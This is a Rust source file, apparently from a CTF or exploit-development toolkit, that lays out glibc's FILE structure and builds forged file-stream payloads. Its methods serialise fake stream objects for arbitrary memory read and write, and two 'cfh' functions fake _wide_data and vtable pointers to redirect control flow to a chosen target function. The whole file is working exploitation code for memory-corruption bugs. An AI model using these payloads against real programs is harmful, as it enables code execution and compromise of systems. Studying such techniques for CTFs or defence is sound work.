use std::mem::offset_of;

// https://stackoverflow.com/a/42186553
unsafe fn any_as_u8_slice<T: Sized>(p: &T) -> &[u8] {
    ::core::slice::from_raw_parts(
        (p as *const T) as *const u8,
        ::core::mem::size_of::<T>(),
    )
}

#[repr(C)]
#[allow(non_snake_case)]
#[derive(Default, Debug, Clone)]
pub struct FileStruct {
    pub _flags: i32,

    pub _IO_read_ptr: u64,
    pub _IO_read_end: u64,
    pub _IO_read_base: u64,
    pub _IO_write_base: u64,
    pub _IO_write_ptr: u64,
    pub _IO_write_end: u64,
    pub _IO_buf_base: u64,
    pub _IO_buf_end: u64,
    pub _IO_save_base: u64,
    pub _IO_backup_base: u64,
    pub _IO_save_end: u64,
    pub _markers: u64,
    pub _chain: u64,
    pub _fileno: i32,
    pub _flags2: i32,
    pub _old_offset: u64,
    pub _cur_column: u16,
    pub _vtable_offset: i8,
    pub _shortbuf: u8,

    pub _lock: u64,
    pub _offset: u64,
    pub _codecvt: u64,
    pub _wide_data: u64,
    pub _freeres_list: u64,
    pub _freeres_buf: u64,
    pub __pad5: u64,
    pub _mode: i32,
    pub _unused2: [u8; 20],

    pub vtable: u64,
}

impl FileStruct {
    pub fn read(&mut self, addr: u64, size: u64) -> Vec<u8> {
        self._flags &= !4;
        self._IO_read_base = 0;
        self._IO_read_ptr = 0;
        self._IO_buf_base = addr;
        self._IO_buf_end = addr+size;
        self._fileno = 0;
        self.as_bytes()[..offset_of!(FileStruct, _flags2)].to_vec()
    }

    pub fn write(&mut self, addr: u64, size: u64) -> Vec<u8> {
        self._flags &= !8;
        self._flags |= 0x800;
        self._IO_write_base = addr;
        self._IO_write_ptr = addr+size;
        self._IO_read_end = addr;
        self._fileno = 1;
        self.as_bytes()[..offset_of!(FileStruct, _flags2)].to_vec()
    }

    pub fn cfh_write(&mut self, fp_start: u64, wfile_jumps: u64, target: u64) -> Vec<u8> {
        self._flags = 0;

        // ensure _lock is a valid pointer to null bytes
        self._lock = fp_start + offset_of!(FileStruct, _unused2) as u64;

        // offset of vtable in struct _IO_wide_data
        let wide_data_vtable_off = 0xe0;

        // the third qword is our vtable pointer
        self._wide_data = fp_start-wide_data_vtable_off+0x10;

        // the fourth qword is our target function pointer
        self._IO_read_end = fp_start-0x68+0x18;

        self._IO_read_base = target;

        // shift by -0x20 to make __xputn instead call __overflow
        self.vtable = wfile_jumps-0x20;

        self.as_bytes()
    }

    pub fn cfh_read(&mut self, fp_start: u64, wfile_jumps: u64, target: u64) -> Vec<u8> {
        self._flags = 0;

        // ensure _lock is a valid pointer to null bytes
        self._lock = fp_start + offset_of!(FileStruct, _unused2) as u64;

        // offset of vtable in struct _IO_wide_data
        let wide_data_vtable_off = 0xe0;

        // the third qword is our vtable pointer
        self._wide_data = fp_start-wide_data_vtable_off+0x10;

        // the fourth qword is our target function pointer
        self._IO_read_end = fp_start-0x68+0x18;

        self._IO_read_base = target;

        // shift by -0x20 to make __xputn instead call __overflow
        self.vtable = wfile_jumps-0x28;

        self.as_bytes()
    }

    pub fn as_bytes(&self) -> Vec<u8> {
        unsafe { any_as_u8_slice(self).to_vec() }
    }
}
